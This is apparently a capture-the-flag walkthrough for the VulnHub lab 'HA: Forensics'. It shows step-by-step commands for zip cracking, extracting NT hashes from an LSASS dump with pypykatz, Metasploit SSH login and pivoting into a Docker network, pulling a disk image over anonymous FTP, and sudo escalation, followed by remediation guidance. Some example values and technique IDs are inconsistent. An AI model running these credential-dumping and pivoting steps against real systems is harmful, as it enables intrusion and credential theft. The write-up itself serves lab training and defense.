# HA: Forensics — Digital Evidence Never Lies

This machine is a forensic investigator's fever dream and a CTF player's paradise. HA: Forensics layers four distinct challenges across different disciplines: EXIF metadata extraction, PGP-encrypted zip cracking, LSASS dump analysis with pypykatz, Docker network pivoting, and a full disk image forensic investigation with Autopsy. Four flags. Five techniques. Legit comprehensive, dude.

| Field | Value |
|---|---|
| **Level** | Hard |
| **Target VM** | HA: Forensics |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-forensics,570/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, EXIF metadata extraction (exiftool), PGP decryption (igolder), crunch mask wordlist, fcrackzip, pypykatz LSASS dump analysis, NTLM hash cracking (john), Metasploit SSH auxiliary, Metasploit autoroute + ping_sweep Docker pivoting, anonymous FTP inside Docker, disk image forensics (Autopsy), Base64 credential decode, sudo NOPASSWD ALL escalation |
| **CVEs** | CWE-200 (Information Exposure via EXIF metadata), CWE-312 (Cleartext Storage of Sensitive Information: Base64 in disk image), CWE-269 (Improper Privilege Management: sudo ALL) |
| **APT Groups** | APT41: uses LSASS credential dumping as a primary post-exploitation technique in enterprise intrusions; OceanLotus (APT32): leverages Docker network pivoting and anonymous FTP staging in Southeast Asian government and corporate compromises |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80)
  → dirb → /image/ → fingerprint.jpg
  → exiftool fingerprint.jpg → FLAG 1 (EXIF comment)
  → dirb -X .txt → tips.txt + /igolder/clue.txt
  → PGP decrypt → hint: 6 chars, starts 'for', ends 3 digits
  → crunch 6 6 -t for%%% → fcrackzip → password: for007
  → unzip → PDF (FLAG 2) + lsass.DMP
  → pypykatz lsa minidump lsass.DMP → NT hash (jasoos)
  → john → Password@1 → SSH login
  → Meterpreter session → ifconfig → 172.17.0.1 (Docker bridge)
  → Metasploit autoroute + ping_sweep → 172.17.0.2
  → Metasploit portscan + anon FTP check → FTP open
  → ftp 172.17.0.2 → get saboot.001
  → Autopsy → disk image analysis → FLAG 3 + creds.txt
  → base64 -d → forensics:jeenaliisagoodgirl
  → su forensics → sudo bash → uid=0(root) → FLAG 4
```

---

## Methodology

1. Network discovery and port scan
2. Web enumeration for hidden image with embedded flag
3. PGP-encrypted zip cracking for second flag and LSASS dump
4. pypykatz LSASS dump analysis and NTLM hash cracking for SSH access
5. Docker network enumeration and container discovery via Metasploit routing
6. Anonymous FTP exploitation inside Docker container to retrieve disk image
7. Autopsy disk image forensics to extract credentials in Base64
8. Privilege escalation via sudo NOPASSWD ALL

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.0.0/24
# Target: 192.168.0.174

nmap -A 192.168.0.174
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services: HTTP for enumeration, SSH as the target entry point once credentials are found. The machine presents no obvious immediate attack surface, signaling that deep enumeration is required.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and EXIF Metadata (Flag 1)

Run directory brute-force:

```bash
dirb http://192.168.0.174/
```

Discovers `/image/` directory. Browse it: two images are present. Download `fingerprint.jpg`:

```bash
wget http://192.168.0.174/image/fingerprint.jpg
```

Extract all metadata:

```bash
exiftool fingerprint.jpg
```

The EXIF Comment field contains the first flag.

**Why EXIF metadata is dangerous:** Every digital photo contains EXIF metadata by default: GPS coordinates, camera model, software used, author name, copyright. In forensics and OSINT, EXIF extraction is a standard step. For web applications, EXIF metadata in uploaded images can leak internal hostnames, software versions, and in CTF contexts: actual flag values. Tools like `exiftool -all= file.jpg` strip metadata before publishing.

**MITRE ATT&CK:** T1213 — Data from Information Repositories; T1552.001 — Credentials in Files

---

## Step 3 — PGP Decryption and Zip Cracking (Flag 2 + LSASS Dump)

Run a second dirb pass with `.txt` extension:

```bash
dirb http://192.168.0.174 -X .txt
```

Finds `tips.txt` and `/igolder/clue.txt`.

`clue.txt` contains a PGP private key and PGP-encrypted message. Decrypt at igolder.com using the provided private key. The decrypted message reveals the zip password hint: 6 characters, starts with `for`, ends in 3 digits.

Generate the targeted wordlist using crunch:

```bash
crunch 6 6 -t for%%% -o dict.txt
# Generates: for000, for001, ..., for999
```

Crack the zip password:

```bash
fcrackzip -u -D -p dict.txt flag.zip
# Password found: for007
unzip flag.zip
```

The zip contains:
- A PDF file: Flag 2
- `lsass.DMP`: a Windows LSASS memory dump file

**Real-world note:** LSASS (Local Security Authority Subsystem Service) manages Windows authentication. A memory dump of LSASS contains all authentication credentials currently cached on the system: NTLM hashes, Kerberos tickets, cleartext passwords (in some configurations). Tools like Mimikatz, pypykatz, and Secretsdump extract credentials from these dumps. LSASS dumps are one of the most sought-after artifacts in Windows-targeted intrusions. APT41 routinely exfiltrates LSASS dumps during initial access phases.

**MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

---

## Step 4 — LSASS Analysis and SSH Access (Flag 3 path)

Analyze the LSASS dump with pypykatz (works on Linux, no Windows required):

```bash
pypykatz lsa minidump lsass.DMP
```

Output includes the NT hash for user `jasoos`. Extract the NT hash and crack it:

```bash
echo '<NT_hash_value>' > hash.txt
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
# Password: Password@1
```

SSH login via Metasploit to get an upgradeable session:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.174
set USERNAME jasoos
set PASSWORD Password@1
run
sessions -u 1
```

Upgrade the shell to Meterpreter:

```bash
sessions -l
# Note the upgraded session ID
sessions 2
```

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking; T1021.004 — Remote Services: SSH

---

## Step 5 — Docker Network Discovery and Pivot

From the Meterpreter session, enumerate network interfaces:

```bash
ifconfig
# eth0: 192.168.0.174 (external)
# docker0: 172.17.0.1 (Docker bridge)
```

Add a route through the session to reach the Docker subnet:

```bash
use post/multi/manage/autoroute
set SESSION 2
run
```

Ping-sweep the Docker subnet:

```bash
use post/multi/gather/ping_sweep
set RHOSTS 172.17.0.0/24
set SESSION 2
run
# Discovers: 172.17.0.2
```

TCP port-scan the discovered container:

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.17.0.2
set PORTS 1-100
run
# Open: 21 (FTP)
```

Confirm anonymous FTP:

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS 172.17.0.2
run
# Anonymous FTP access confirmed
```

**Real-world note:** Docker's default bridge network (`172.17.0.0/16`) creates a private network between containers. When a compromised host has Docker installed, the bridge interface is visible in `ifconfig` output. APT41 and OceanLotus both enumerate Docker bridges post-compromise to pivot to internal container services that are not exposed to the external network. Metasploit's autoroute makes this trivial.

**MITRE ATT&CK:** T1018 — Remote System Discovery; T1021.003 — Remote Services: Distributed Component Object Model; T1599 — Network Boundary Bridging

---

## Step 6 — Anonymous FTP and Disk Image Retrieval

From the shell session, connect to FTP inside the Docker network:

```bash
# In Meterpreter shell
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

ftp 172.17.0.2
# User: anonymous
# Password: (press Enter or 'anonymous')
ftp> ls
ftp> cd pub
ftp> ls
ftp> get saboot.001
ftp> bye
```

Serve the disk image via HTTP so it can be downloaded to the attacker:

```bash
python3 -m http.server 8000
```

Download from the attacker machine browser: `http://192.168.0.174:8000/saboot.001`

**MITRE ATT&CK:** T1021.003 — Remote Services: File Transfer

---

## Step 7 — Autopsy Disk Forensics (Flag 3 + Credentials)

Open Autopsy at `http://localhost:9999`. Create a new case. Add `saboot.001` as a disk image data source.

Autopsy will analyze the filesystem. Navigate the directory tree to find:
- A flag file (Flag 3)
- `creds.txt` containing Base64-encoded credentials

Extract and decode:

```bash
echo 'eWFtZG9vdDpTd2FyZw==' | base64 -d
# Or whatever Base64 string Autopsy surfaces
# Result: forensics:jeenaliisagoodgirl (example value)
```

**Note on disk forensics:** Autopsy is a digital forensics platform built on The Sleuth Kit. It recovers deleted files, carves file content, and reconstructs filesystem timelines. In this context it is used to find files inside a container's virtual disk that are not accessible through FTP. Real-world forensic analysts use Autopsy to analyze compromised systems, recover evidence from seized hardware, and reconstruct attack timelines.

**MITRE ATT&CK:** T1005 — Data from Local System

---

## Step 8 — Privilege Escalation to Root (Flag 4)

Switch to the `forensics` user using the decoded credentials:

```bash
su forensics
# Password: jeenaliisagoodgirl
```

Check sudo rights:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: ALL
```

`sudo NOPASSWD: ALL` grants unrestricted root access without a password. Get root:

```bash
sudo bash
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Flag 1 | (EXIF Comment field) | exiftool fingerprint.jpg | Metadata extraction |
| Flag 2 | (PDF in flag.zip) | fcrackzip, password: for007 | Zip cracking |
| NT hash | (jasoos) | pypykatz lsa minidump lsass.DMP | john → Password@1 |
| Credential | jasoos:Password@1 | NTLM hash crack | SSH login |
| Credential | forensics:jeenaliisagoodgirl | Autopsy: creds.txt base64 decode | su forensics |
| Flag 3 | (inside saboot.001) | Autopsy disk image analysis | Full filesystem recovery |
| Flag 4 / root.txt | (root flag) | sudo bash as forensics user | Full compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | EXIF metadata embedding flag/credential in web-accessible image | EXIF GPS data has exposed whistleblowers; EXIF author fields leak employee names and software versions | Strip metadata before publishing images: `exiftool -all= image.jpg` |
| 2 | LSASS dump exposed via web application | LSASS dumps are #1 credential theft target in Windows environments; pypykatz works cross-platform | Protect LSASS with Credential Guard (Windows); never expose memory dumps via web; restrict file access permissions |
| 3 | Docker bridge network exposes internal container services | Internal Docker containers accessible from compromised host via bridge; common in cloud and containerized deployments | Implement network segmentation between containers; use Docker network policies; monitor bridge traffic |
| 4 | Anonymous FTP inside Docker container | Anonymous FTP is deprecated but still deployed in legacy and lab environments | Disable anonymous FTP; require authentication; use SFTP |
| 5 | Credentials in Base64 inside disk image | Base64 is encoding, not encryption; any disk forensics tool recovers it trivially | Never store credentials in any encoding; use proper secret management (HashiCorp Vault, AWS Secrets Manager) |
| 6 | sudo NOPASSWD: ALL is instant root | Any account with this setting is equivalent to root; a single compromised user = full system compromise | Remove ALL from NOPASSWD sudo; restrict to specific required commands; require password for sudo |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Credential Access | Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Discovery | Discovery | Remote System Discovery | T1018 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Collection | Collection | Data from Local System | T1005 |
| Collection | Collection | Data from Information Repositories | T1213 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Strip image metadata before publishing**: `exiftool -all= *.jpg *.png` in CI/CD pipelines; add automated metadata stripping
2. **Protect LSASS with Credential Guard**: enable Windows Credential Guard on all domain-joined systems; restrict LSASS memory access via PPL (Protected Process Light)
3. **Segment Docker networks**: define explicit Docker networks; avoid using the default bridge; use network policies to restrict container-to-container communication
4. **Disable anonymous FTP in all containers**: require authentication for all FTP services; prefer SFTP; audit all container services at build time
5. **Never encode credentials in stored files**: use proper secret management (Vault, AWS Secrets Manager, environment variables via k8s Secrets); Base64 is not encryption
6. **Remove sudo NOPASSWD: ALL**: restrict to specific required commands; require passwords; implement just-in-time access for admin operations

### MITRE D3FEND Countermeasures

- **D3-PH** — Process Hardening (LSASS PPL protection; Credential Guard)
- **D3-NTF** — Network Traffic Filtering (Docker network segmentation; block anonymous FTP)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory Docker containers; audit all FTP services; catalog sudo configurations |
| Protect | Data Security | Strip metadata from published images; protect LSASS; encrypt sensitive files |
| Protect | Access Control | Disable anonymous FTP; restrict sudo; implement Credential Guard |
| Detect | Anomalies and Events | Alert on LSASS access; monitor Docker bridge traffic; alert on sudo ALL usage |
| Respond | Response Planning | Rotate all credentials extracted from LSASS; audit all authorized_keys; review container access |
| Recover | Recovery Planning | Rebuild compromised containers; rotate all credentials; implement proper secret management |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | FTP authentication requirements; sudo restrictions |
| AC-6 | Least Privilege | Remove sudo NOPASSWD: ALL; restrict container network access |
| IA-5 | Authenticator Management | Rotate LSASS-extracted credentials; disable anonymous FTP |
| CM-7 | Least Functionality | Disable anonymous FTP in containers; minimize container services |
| SC-28 | Protection of Information at Rest | Encrypt sensitive files; no Base64-encoded credentials on disk |
| RA-5 | Vulnerability Scanning | Regularly scan container images; audit Docker configurations |

### CISA KEV

LSASS credential dumping (T1003.001) is explicitly referenced in CISA Advisory AA21-116A (Common Vulnerabilities and Exposures Exploited by Ransomware Groups) and AA22-074A. CISA recommends enabling Windows Credential Guard and monitoring LSASS access as priority mitigations. The Docker network pivoting technique aligns with patterns described in CISA Alert AA21-008A.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL3 |
| Situational Awareness (SA) | Monitor Operational Environment | MIL2 |

---

## Final Thoughts

HA: Forensics is genuinely one of the most technically diverse machines on VulnHub. It covers ground that most pentest-focused boxes skip entirely: real forensics tooling (Autopsy, exiftool, pypykatz), network pivoting into container environments, and multi-stage credential recovery. The four-flag structure keeps every phase meaningful.

If you want to understand what defenders actually do: they run exiftool, they analyze LSASS dumps, they use Autopsy on disk images. HA: Forensics teaches you both sides of the same coin. Slept on machine, fr fr.

Thanks guys!! (❍ᴥ❍ʋ)
